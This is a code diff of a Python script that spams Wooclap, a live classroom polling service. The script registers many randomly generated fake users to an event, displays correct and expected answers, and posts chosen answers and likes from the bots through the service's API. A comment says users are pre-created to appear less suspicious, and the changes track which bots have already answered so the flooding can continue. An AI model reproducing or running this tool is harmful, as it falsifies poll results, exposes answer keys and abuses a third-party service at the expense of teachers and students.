@@ -6,6 +6,8 @@ import requests
 import random
 import os
 
+id_last_user_answered = {} # Sauvegarde l'index du dernier utilisateur à avoir répondu
+
 def generate_users(n):
     return [random.randint(100000000000, 999999999999) for _ in range(n)]
 
@@ -28,61 +30,88 @@ def add_users(users, n):
     return users + generate_users(n)
 
 def attack_mcq_question(question, users, questionType):
+    global id_last_user_answered
+
+    if not question['_id'] in id_last_user_answered:
+        id_last_user_answered[question['_id']] = 0
+
     choices = []
     print(f"______{questionType}______\n\nQuestion: {question['title']}")
     for i, choice in enumerate(question['choices'], start=1):
         print(f"[{i}] {choice['choice']}" + (f" [Correct: {choice['isCorrect']}]" if questionType == "MCQ" else ""))
 
-    if question['multipleChoice']:
-        print("\nThis is a multiple-choice question. To select several answers, answer like this: '0+2'.")
-        answer = input("Which answer(s) do you want to respond?  ('-1' return to the menu)\n> ").replace(" ","").split('+')
-        choices = [question['choices'][int(r)-1]['_id'] for r in answer]
-    else:
-        answer = input("Which answer do you want to respond?  ('-1' return to the menu)\n> ").strip()
-        choices = [question['choices'][int(answer)-1]['_id']]
+    try:
+        if question['multipleChoice']:
+            print("\nThis is a multiple-choice question. To select several answers, answer like this: '0+2'.")
+            answer = input("Which answer(s) do you want to respond?  ('-1' return to the menu)\n> ").replace(" ","").split('+')
+            choices = [question['choices'][int(r)-1]['_id'] for r in answer]
+        else:
+            answer = input("Which answer do you want to respond?  ('-1' return to the menu)\n> ").strip()
+            choices = [question['choices'][int(answer)-1]['_id']]
+    except:
+        return
     if answer == "-1": # Donne l'occasion à l'utilisateur de revenir au menu
         return
 
-    spam_number = min(int(input(f"How many of them do you want to spam (max: {len(users)})?\n> ")), len(users)) # Prend au maximum le nombre de bots dans la liste
+    number_of_users = len(users)
 
-    for i in range(spam_number):
+    start = 0
+    end = int(input(f"How many of them do you want to spam (max: {number_of_users-id_last_user_answered[question['_id']]})?\n> "))+id_last_user_answered[question['_id']]
+
+    if end > number_of_users:
+        end = number_of_users
+
+    if id_last_user_answered[question['_id']] != 0:
+        start=id_last_user_answered[question['_id']]
+
+    for i in range(start, end):
         headers = get_wooclap_headers(users[i])
         json_data = {'choices': choices, 'comment': '', 'token': f'z{users[i]}'}
         requests.post(f'https://app.wooclap.com/api/questions/{question["_id"]}/push_answer', headers=headers, json=json_data)
+    
+    id_last_user_answered[question['_id']] = end
+    
 
 def attack_open_question(question, users):
-    headers = get_wooclap_headers(users[0])
+    global id_last_user_answered
+
+    if not question['_id'] in id_last_user_answered:
+        id_last_user_answered[question['_id']] = 0
+
+    if len(users)-id_last_user_answered[question['_id']] == 0:
+        return
+        
+    headers = get_wooclap_headers(users[id_last_user_answered[question['_id']]])
     print(f"______Open question______\n\nTitle: {question['title']}")
+
     if question['allExpectedAnswers']:
         print(f"Expected answers: {question['allExpectedAnswers']}")
+
+    if not question['multipleAnswers']:
+        print(len(users)-id_last_user_answered[question['_id']],"réponses restantes")
+    
+    id_last_user_answered[question['_id']] += 1
+
     answer = input("What do you want to answer? ('-1' return to the menu)\n> ").strip()
+
     if answer == "-1": # Donne l'occasion à l'utilisateur de revenir au menu
         return
 
     json_data = {'text': answer, 'image': None}
-    answer_response = requests.post(f'https://app.wooclap.com/api/questions/{question["_id"]}/push_answer', headers=headers, json=json_data)
-
-    while answer_response.status_code == 403:
-        for user_id in users:
-            headers = get_wooclap_headers(user_id)
-            json_data = {'text': answer, 'image': None}
-            answer_response = requests.post(f'https://app.wooclap.com/api/questions/{question["_id"]}/push_answer', headers=headers, json=json_data)
-            if answer_response.status_code == 200:
-                break
-
-    answer_response = answer_response.json()
+    response = requests.post(f'https://app.wooclap.com/api/questions/{question["_id"]}/push_answer', headers=headers, json=json_data)
+    response = response.json()
 
     if question['canLike']:
-        number_of_likes = min(int(input(f"How many likes do you want to your answer? (max: {len(users)})\n> ").strip()), len(users))
+        number_of_likes = min(int(input(f"How many likes do you want to your answer? (MAX: {len(users)})\n> ").strip()), len(users))
         for i in range(number_of_likes):
             headers = get_wooclap_headers(users[i])
             json_data = {'toggle': True}
-            requests.post(f'https://app.wooclap.com/api/questions/{question["_id"]}/answers/{answer_response["userAnswer"]["_id"]}/toggle_like', headers=headers, json=json_data)
+            requests.post(f'https://app.wooclap.com/api/questions/{question["_id"]}/answers/{response["userAnswer"]["_id"]}/toggle_like', headers=headers, json=json_data)
 
 def create_users(list_of_users, event_code):
     os.system('cls||clear')
     print("######################################")
-    print("###### CREATING THE USERS ############")
+    print("######### CREATING THE USERS #########")
     print("######################################")
     for user in list_of_users: # Augmente le nombre d'utilisateurs dés leur initialisation pour paraitre moins suspect
         requests.post(f"https://app.wooclap.com/api/user?slug={event_code}", headers=get_wooclap_headers(user))
@@ -95,18 +124,18 @@ event_code = input("What is the event code of the Wooclap?\n> ")
 
 create_users(list_of_users, event_code)
 
-max_user = False
-
 while True:
     os.system('cls||clear')
     print("################ MENU ################\n")
-    if max_user:
-        print("NOTE: All your bots have ever answered to the previous question")
     print("[1] Attack the question")
     print("[2] Add new users (Current: {})".format(len(list_of_users)))
     print("[3] Change the event code (Current: {})".format(event_code))
     print("[4] EXIT")
-    choice = int(input("> ").strip())
+
+    try:
+        choice = int(input("> ").strip())
+    except:
+        continue
 
     if choice == 2:
 
